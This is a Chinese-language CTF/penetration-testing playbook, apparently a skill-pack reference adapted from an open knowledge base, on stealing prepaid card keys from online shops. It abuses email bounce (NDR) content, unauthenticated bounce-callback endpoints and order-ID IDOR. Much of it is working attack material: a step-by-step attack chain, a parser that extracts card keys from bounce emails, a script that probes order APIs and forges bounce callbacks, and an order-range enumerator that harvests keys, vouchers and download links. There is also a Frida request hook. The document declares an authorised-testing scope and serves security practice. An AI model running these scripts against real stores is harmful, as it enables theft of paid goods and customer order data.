# 退信滥用 + 订单号授权绕过窃取卡密

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/12-payment/payment-email-bounce-idor.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「退信 / NDR / bounce / IDOR」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- 退信
- NDR
- bounce
- IDOR
- 订单号
- 卡密泄露
- order leak
- CWE-639
- CWE-862

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **读到卡密/下载链接** — `payment-digital-goods.md`
2. **读到支付状态/金额** — `payment-callback-async.md`
3. **读到邮箱/手机号** — 本文
4. **读到商品/sku/plan** — `payment-logic.md`
5. **读到数据库字段名** — `../../../database-security/references/sqli/05-backup-log-leak.md`

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **输入信号** — 下单后系统自动发送含卡密/激活码/订单详情的邮件
- **输入信号** — 邮件发送到不存在地址时产生退信（Non-Delivery Receipt）
- **输入信号** — 退信内容包含原始邮件正文（含卡密）
- **输入信号** — 订单详情页/API 仅通过订单号查询，不验证用户身份
- **输入信号** — 订单号可预测（自增 ID、短随机串、时间戳序列）
- **输入信号** — 退信处理端点（webhook/API）对外暴露且无来源验证
- **Evidence** — `order_probe_matrix.csv`: order_id、email/token、登录态、状态码、响应长度、关键字段。
- **Evidence** — `bounce_payloads.json`: 退信/邮件链接里的订单号、签名、一次性 token、过期时间。
- **Evidence** — `role_compare.json`: 匿名、订单所有者、其他用户、管理员的响应字段 diff。
- **Evidence** — `order_bounce_idor_matrix.csv`: 订单窗口枚举输出、命中字段、响应样本。
- **Evidence** — 成功样本: 非订单所有者读到订单、支付状态、下载链接、优惠券或 flag。
- **Evidence** — 失败样本: 只返回公共状态、链接过期、token 绑定邮箱或订单所有者。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 场景

电商/发卡系统在处理订单通知邮件时，退信（NDR/Bounce）逻辑存在信息泄露和授权绕过，攻击者通过构造不存在邮箱触发退信，利用退信内容或退信处理接口，结合订单号 IDOR 批量提取数据库中的卡密/优惠券码。

## 输入信号

- 下单后系统自动发送含卡密/激活码/订单详情的邮件
- 邮件发送到不存在地址时产生退信（Non-Delivery Receipt）
- 退信内容包含原始邮件正文（含卡密）
- 订单详情页/API 仅通过订单号查询，不验证用户身份
- 订单号可预测（自增 ID、短随机串、时间戳序列）
- 退信处理端点（webhook/API）对外暴露且无来源验证

## 漏洞分类

### 类型 1：退信 NDR 内容泄露

```
下单(假邮箱) → 系统发邮件(含卡密) → 不存在 → 退信
                                            │
                                    退信包含原始邮件内容
                                            │
                                    攻击者通过退信渠道拿到卡密
```

**关键条件**：
- 邮件服务器将原始邮件内容回传在退信中
- 系统未过滤退信中的敏感信息
- 退信能被攻击者接收或读取

### 类型 2：退信处理接口 IDOR

```
下单(假邮箱) → 退信回到系统 → 退信处理接口解析订单号
                                    │
                            接口未验证调用者身份
                                    │
                            攻击者直接调接口 → 查任意订单卡密
```

**关键条件**：
- 退信处理是独立的 webhook/API 端点
- 端点未做来源 IP 白名单或签名验证
- 凭订单号即可查询订单完整信息

### 类型 3：订单查询接口无鉴权（CWE-639 / CWE-862）

```
攻击者知道订单号 → GET /orders/{id} → 返回完整订单含卡密
```

## 判定矩阵

| 信号 | 直接动作 | 命中样本 | 失败样本 |
|------|----------|----------|----------|
| 订单号自增或短随机串 | 匿名/B 账号请求 A 订单详情 | 返回 `status/amount/card_key/download_url` | 只返回公共状态或 404 |
| 邮件链接含 `order_id/token` | 改 `order_id`、保留 token、换账号访问 | token 不绑定订单或邮箱 | token 与订单/邮箱强绑定 |
| 退信含原始正文 | 用不存在邮箱下单，解析 NDR multipart | 原始 HTML/文本里有卡密/下载链接 | 只返回 SMTP headers |
| 退信 webhook 暴露 | 构造 DSN JSON/XML/表单回调 | 回调响应带订单对象或触发重发 | 仅接受真实队列事件 |
| 订单查询 GraphQL | 替换 `id/orderNo/email` 参数 | 非所有者读到订单节点 | resolver 过滤当前用户 |
| 下单即预生成卡密 | 未支付订单触发通知/退信 | 未支付也能看到卡密字段 | 发货时才生成卡密 |

### 邮件/订单/卡密三元组

退信链的核心不是“邮箱不存在”，而是邮件、订单和发货账本的绑定关系被拆开了。先把三元组建出来，再决定走退信、订单 IDOR、回调或数据库路线。

| 维度 | 证据字段 | 操作 | 命中后下一跳 |
|---|---|---|---|
| 邮件 | `Message-ID`, `Return-Path`, `X-Original-To`, 收件人 | 解析 NDR multipart 与原始正文 | 邮件模板、重发接口 |
| 订单 | `order_id`, `order_sn`, `out_trade_no`, `trade_no` | 匿名/跨账号/退信 token 对比 | IDOR、回调重放 |
| 卡密/权益 | `card_key`, `coupon`, `download_url`, `license` | 未支付/已支付/退款后三态回读 | 数字商品、发货状态机 |
| 数据库 | 表前缀、字段名、报错、日志片段 | 反推订单表和卡密表 | 备份/日志、发卡平台 |
| 支付 | `status`, `paid_at`, `amount`, `refund_id` | 观察退信是否触发重发/补发 | 支付状态机、异步队列 |

三元组解析器：

```python
# bounce_order_tuple_extractor.py
import csv
import email
import email.policy
import json
import re
from pathlib import Path

PATTERNS = {
    "order_id": re.compile(r"(?:order[_ -]?(?:id|sn|no)|out_trade_no|trade_no)[\"'=:\s]+([A-Za-z0-9_-]{4,64})", re.I),
    "card_key": re.compile(r"(?:card[_ -]?key|卡密|兑换码|license|secret)[\"'=:\s：]+([A-Za-z0-9_-]{6,128})", re.I),
    "payment": re.compile(r"(?:amount|money|paid_at|payment_status|refund_id)[\"'=:\s]+([^<>\s,]{1,80})", re.I),
    "download": re.compile(r"https?://[^\s\"'<>]+(?:download|card|order|license)[^\s\"'<>]*", re.I),
}

def parts(msg):
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_maintype() == "text":
                yield part.get_content()
    else:
        yield msg.get_content()

def extract_one(path):
    msg = email.message_from_string(Path(path).read_text(encoding="utf-8", errors="ignore"), policy=email.policy.default)
    text = "\n".join(parts(msg))
    row = {
        "file": Path(path).name,
        "message_id": msg.get("Message-ID", ""),
        "return_path": msg.get("Return-Path", ""),
        "original_to": msg.get("X-Original-To", ""),
    }
    for key, rx in PATTERNS.items():
        row[key] = "|".join(sorted(set(rx.findall(text))))[:500]
    return row

def extract_dir(mail_dir, out_csv="exports/bounce_order_tuple.csv"):
    rows = [extract_one(p) for p in Path(mail_dir).glob("*.eml")]
    Path("exports").mkdir(exist_ok=True)
    if not rows:
        Path(out_csv).write_text("file,message_id,return_path,original_to,order_id,card_key,payment,download\n", encoding="utf-8")
        return []
    with open(out_csv, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=rows[0].keys())
        w.writeheader()
        w.writerows(rows)
    Path("exports/bounce_order_tuple.json").write_text(json.dumps(rows, ensure_ascii=False, indent=2), encoding="utf-8")
    return rows
```

判定节奏：

1. 用平台指纹确定订单查询和支付插件路径。
2. 生成一组可控订单：正常邮箱、不可达邮箱、同域别名、大小写邮箱。
3. 把 NDR 原文、订单详情、支付状态回读对齐成 `bounce_order_tuple.csv`。
4. 如果退信里有 `order_id` 但无卡密，继续打订单详情/重发接口。
5. 如果退信里出现字段名或 SQL 报错，转数据库备份/日志链补表结构。

## 攻击链

```
1. 侦察：注册/下单流程抓包，确认订单号格式（自增/时间戳/UUID）
2. 获取订单号：支付回调 URL、邮件链接、页面跳转 Referer、Burp 被动扫描
3. 测试订单查询接口：不带 Cookie/Token 直接 GET /order/detail?id=1001
   → 若返回订单信息 + 卡密 → 直接 IDOR，跳过后续步骤
4. 若需要"支付后才发卡密"：填假邮箱下单但不支付
   → 部分系统下单时已生成卡密入库，只是不展示
   → 退信触发时系统可能把卡密回显
5. 退信利用：
   a. 发送大量邮件到 @nonexist.example.com → 触发退信
   b. 分析退信内容，提取卡密字段
   c. 如果退信是 webhook 回调：模拟 NDR 格式 POST 到系统退信端点
6. 批量枚举：遍历订单号 → 收集卡密/下载链接/flag → 回填命中与失败样本
```

## Frida/JS Hook 辅助

```javascript
// 场景：分析 APK/Web 应用的订单查询逻辑
// Hook 关键函数确认鉴权缺失

// 1. Hook OkHttp 请求（Android APK）
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Request = Java.use("okhttp3.Request");
    Request.newBuilder.implementation = function() {
        var builder = this.newBuilder.apply(this, arguments);
        console.log("[OkHttp] URL:", builder.build().url().toString());
        console.log("[OkHttp] Headers:", builder.build().headers().toString());
        return builder;
    };
});

// 2. 修改订单号参数测试越权
// Burp Suite Intruder: 对 orderId 参数做枚举
// Payload: 自增 1000-9999
```

## HTTP 探测

```python
# 探测订单详情接口是否存在 IDOR
import requests

def test_order_idor(base_url, order_id_range):
    """测试订单查询接口是否需要鉴权"""
    for oid in order_id_range:
        # 不带 Cookie 请求
        r = requests.get(f"{base_url}/api/order/detail", params={"id": oid})
        if r.status_code == 200 and ("卡密" in r.text or "voucher" in r.text.lower()):
            print(f"[!] IDOR found: order {oid} leaks card key")
            print(f"    Response: {r.text[:500]}")

        # 测试退信回调接口
        r2 = requests.post(f"{base_url}/api/bounce/callback", json={
            "order_id": oid,
            "bounce_type": "permanent",
            "email": "nonexist@fake.example.com"
        })
        if r2.status_code == 200:
            print(f"[!] Bounce callback accessible: order {oid}")
            print(f"    Response: {r2.text[:500]}")

test_order_idor("https://target.com", range(1000, 1100))
```

### 订单窗口枚举器

```python
import csv
import re
import requests

KEY_RX = re.compile(r"(card[_-]?key|voucher|coupon|download|flag\{[^}]+\})", re.I)

def enumerate_orders(base, start, end, cookie=None):
    s = requests.Session()
    if cookie:
        s.headers["Cookie"] = cookie
    rows = []
    for oid in range(start, end + 1):
        for path in (f"/order/{oid}", "/api/order/detail"):
            params = {} if path.startswith("/order/") else {"id": oid}
            r = s.get(base + path, params=params, timeout=8, allow_redirects=False)
            hit = bool(KEY_RX.search(r.text))
            rows.append({
                "order_id": oid,
                "path": path,
                "status": r.status_code,
                "length": len(r.text),
                "hit": hit,
                "sample": r.text[:160].replace("\n", "\\n"),
            })
            if hit:
                print("[hit]", oid, path, r.text[:240])
    with open("order_bounce_idor_matrix.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=rows[0].keys())
        w.writeheader()
        w.writerows(rows)
```

## 下一跳矩阵

| 命中结果 | 下一步 | 关联文档 |
|----------|--------|----------|
| 读到卡密/下载链接 | 检查是否绑定订单所有者、是否可重复领取 | `payment-digital-goods.md` |
| 读到支付状态/金额 | 尝试替换回调里的 `order_id/out_trade_no` | `payment-callback-async.md` |
| 读到邮箱/手机号 | 构造退信、找邮件模板、找通知重发接口 | 本文 |
| 读到商品/sku/plan | 做低价 SKU + 高价权益错配 | `payment-logic.md` |
| 读到数据库字段名 | 反推订单表、卡密表、优惠券表 | `../../../database-security/references/sqli/05-backup-log-leak.md` |

## Evidence

- `order_probe_matrix.csv`: order_id、email/token、登录态、状态码、响应长度、关键字段。
- `bounce_payloads.json`: 退信/邮件链接里的订单号、签名、一次性 token、过期时间。
- `role_compare.json`: 匿名、订单所有者、其他用户、管理员的响应字段 diff。
- `order_bounce_idor_matrix.csv`: 订单窗口枚举输出、命中字段、响应样本。
- 成功样本: 非订单所有者读到订单、支付状态、下载链接、优惠券或 flag。
- 失败样本: 只返回公共状态、链接过期、token 绑定邮箱或订单所有者。
